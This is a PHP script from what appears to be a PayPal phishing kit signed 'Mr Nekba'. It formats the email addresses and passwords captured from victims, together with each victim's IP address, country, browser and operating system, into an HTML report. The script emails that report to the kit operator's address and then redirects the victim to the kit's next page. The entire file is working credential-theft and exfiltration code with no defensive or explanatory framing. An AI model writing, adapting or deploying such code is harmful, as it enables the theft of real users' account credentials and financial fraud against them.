<?php


session_start();
$time = date('d/m/Y G:i:s');
include('../config.php');
include('../get_browser.php');
$S_Z118 .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
<div style=' margin-bottom: 2px;'>
<span style='font-size: 15px;'>################</span> <font style='color: #DF0000;' ><img src=\"http://img15.hostingpics.net/pics/951888ppl.png\" style='position: relative;top: 8px;'></font> <span style='font-size: 15px;'>####################</span></div>
<div>
<span> ±±±±±±±±±±±±±±±±[ <font color='#0070ba' style='font-size: 13px;'>Login Information</font> <span> ]±±±±±±±±±±±±±±±±±±±±±<br></span></span></div>
<span style='color: #00B514'>℗</span><span> [PP Email]&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;</span>
<font style='color: rgb(255, 59, 35);'>".$_SESSION['_login_email_']."</font><br>
<span style='color: #00B514'>℗</span><span> [PP Password] = </span>
<font style='color: rgb(255, 59, 35);'>&nbsp;".$_SESSION['_login_password_']."</font><br>
<div>
<span> ±±±±±±±±±±±±±±±±[ <font color='#0070ba' style='font-size: 13px;'>Login Information</font> <span> ]±±±±±±±±±±±±±±±±±±±±±<br></span></span></div>
<span style='color: #00B514'>℗</span><span> [PP Email]&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;</span>
<font style='color: rgb(255, 59, 35);'>".$_SESSION['_login_email1_']."</font><br>
<span style='color: #00B514'>℗</span><span> [PP Password] = </span>
<font style='color: rgb(255, 59, 35);'>&nbsp;".$_SESSION['_login_password1_']."</font><br>

<div>
<span> ±±±±±±±±±±±±±±±±[ <font style='color:#0070ba;font-size: 13px;'>Victime Information</font> <span> ]±±±±±±±±±±±±±±±±±±±<br></span></span></div>

<span>›</span><span> [IP INFO]&nbsp;= </span><font><a style='color: rgb(255, 59, 35); text-decoration: initial;' href=\"https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."\">https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</a></font>
<span style='color: #00B514'>℗</span><span> [Country]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= </span>
<font style='color: rgb(255, 59, 35);'>&nbsp;".$_SESSION['_countryname_']."</font><br>
<span>›</span><span> [TIME]&nbsp;&nbsp;&nbsp;&nbsp;= </span><font style='color: rgb(255, 59, 35);'>".$time." </font><br>
<span>›</span><span> [BROWSER]&nbsp;= </span><font style='color: rgb(255, 59, 35);'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br><div style=' margin-bottom: 2px;'>
<span style='font-size: 15px;'>################</span><font color='#0070ba' style='font-size: 14px;'> BY Mr Nekba </font><span style='font-size: 15px;'>################</span></div></div>
</html>\n";
$subject = "Mr Nekba | PP L0g In [".$_SESSION['_countrycode_']."] [".$_SESSION['_ip_']."]";
$headers = "From:Mr Nekba <resulta@log.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=UTF-8\n";

@mail($email,$subject,$S_Z118,$headers);
		header("Location: ../websc_info/?websc=_session=".$_SESSION[_countrycode_]."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?>